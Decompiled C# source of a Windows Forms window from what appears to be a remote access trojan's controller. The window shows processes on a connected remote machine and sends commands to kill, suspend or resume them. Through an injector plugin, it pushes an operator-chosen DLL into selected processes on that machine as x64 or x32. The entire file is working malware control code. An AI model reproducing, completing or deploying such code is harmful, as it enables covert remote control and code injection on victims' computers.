using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Threading.Tasks;
using System.Windows.Forms;
using Leb128;
using MaterialSkin;
using MaterialSkin.Controls;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms
{
	// Token: 0x020000B3 RID: 179
	public partial class FormNetstat : FormMaterial
	{
		// Token: 0x06000593 RID: 1427 RVA: 0x0005137E File Offset: 0x0004F57E
		public FormNetstat()
		{
			this.InitializeComponent();
			base.FormClosing += new FormClosingEventHandler(this.Closing1);
		}

		// Token: 0x06000594 RID: 1428 RVA: 0x000513A0 File Offset: 0x0004F5A0
		private void FormProcess_Load(object sender, EventArgs e)
		{
			MaterialSkinManager.Instance.ThemeChanged += this.ChangeScheme;
			this.ChangeScheme(this);
			this.timer1.Start();
			typeof(DataGridView).InvokeMember("DoubleBuffered", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.SetProperty, null, this.dataGridView2, new object[]
			{
				true
			});
		}

		// Token: 0x06000595 RID: 1429 RVA: 0x00051405 File Offset: 0x0004F605
		private void Closing1(object sender, EventArgs e)
		{
			if (this.client != null)
			{
				this.client.Disconnect();
			}
		}

		// Token: 0x06000596 RID: 1430 RVA: 0x0005141C File Offset: 0x0004F61C
		private void ChangeScheme(object sender)
		{
			this.dataGridView2.ColumnHeadersDefaultCellStyle.SelectionForeColor = FormMaterial.PrimaryColor;
			this.dataGridView2.ColumnHeadersDefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
			this.dataGridView2.DefaultCellStyle.SelectionBackColor = FormMaterial.PrimaryColor;
			this.dataGridView2.DefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
		}

		// Token: 0x06000597 RID: 1431 RVA: 0x0005147D File Offset: 0x0004F67D
		private void timer1_Tick(object sender, EventArgs e)
		{
			if (!this.parrent.itsConnect)
			{
				base.Close();
			}
			if (this.client != null && !this.client.itsConnect)
			{
				base.Close();
			}
		}

		// Token: 0x06000598 RID: 1432 RVA: 0x000514B0 File Offset: 0x0004F6B0
		private int[] PidsSelected()
		{
			List<int> list = new List<int>();
			foreach (object obj in this.dataGridView2.SelectedRows)
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				list.Add((int)dataGridViewRow.Cells[1].Value);
			}
			return list.ToArray();
		}

		// Token: 0x06000599 RID: 1433 RVA: 0x00051530 File Offset: 0x0004F730
		private void killRemoveToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.client.Send(LEB128.Write(new object[]
			{
				"Refresh"
			}));
		}

		// Token: 0x0600059A RID: 1434 RVA: 0x00051550 File Offset: 0x0004F750
		private void toolStripMenuItem2_Click(object sender, EventArgs e)
		{
			if (this.dataGridView2.SelectedRows.Count == 0)
			{
				return;
			}
			foreach (int num in this.PidsSelected())
			{
				this.client.Send(LEB128.Write(new object[]
				{
					"Kill",
					num
				}));
			}
		}

		// Token: 0x0600059B RID: 1435 RVA: 0x000515B0 File Offset: 0x0004F7B0
		private void toolStripMenuItem1_Click(object sender, EventArgs e)
		{
			if (this.dataGridView2.SelectedRows.Count == 0)
			{
				return;
			}
			foreach (int num in this.PidsSelected())
			{
				this.client.Send(LEB128.Write(new object[]
				{
					"KillRemove",
					num
				}));
			}
		}

		// Token: 0x0600059C RID: 1436 RVA: 0x00051610 File Offset: 0x0004F810
		private void suspendProcessToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.dataGridView2.SelectedRows.Count == 0)
			{
				return;
			}
			foreach (int num in this.PidsSelected())
			{
				this.client.Send(LEB128.Write(new object[]
				{
					"Suspend",
					num
				}));
			}
		}

		// Token: 0x0600059D RID: 1437 RVA: 0x00051670 File Offset: 0x0004F870
		private void resumeProcessToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.dataGridView2.SelectedRows.Count == 0)
			{
				return;
			}
			foreach (int num in this.PidsSelected())
			{
				this.client.Send(LEB128.Write(new object[]
				{
					"Resume",
					num
				}));
			}
		}

		// Token: 0x0600059E RID: 1438 RVA: 0x000516D0 File Offset: 0x0004F8D0
		private void x64ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\Injector.dll");
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Title = "Choose dll";
				openFileDialog.Filter = "Files(*.dll)|*.dll";
				openFileDialog.Multiselect = false;
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					Task.Run(delegate()
					{
						this.parrent.Send(new object[]
						{
							"Invoke",
							checksum,
							LEB128.Write(new object[]
							{
								"InjectX64",
								Path.GetFileName(openFileDialog.FileName),
								File.ReadAllBytes(openFileDialog.FileName),
								string.Join<int>(";", this.PidsSelected())
							})
						});
					});
				}
			}
		}

		// Token: 0x0600059F RID: 1439 RVA: 0x0005177C File Offset: 0x0004F97C
		private void x32ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\Injector.dll");
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Title = "Choose dll";
				openFileDialog.Filter = "Files(*.dll)|*.dll";
				openFileDialog.Multiselect = false;
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					Task.Run(delegate()
					{
						this.parrent.Send(new object[]
						{
							"Invoke",
							checksum,
							LEB128.Write(new object[]
							{
								"InjectX32",
								Path.GetFileName(openFileDialog.FileName),
								File.ReadAllBytes(openFileDialog.FileName),
								string.Join<int>(";", this.PidsSelected())
							})
						});
					});
				}
			}
		}

		// Token: 0x0400045D RID: 1117
		public Clients client;

		// Token: 0x0400045E RID: 1118
		public Clients parrent;
	}
}
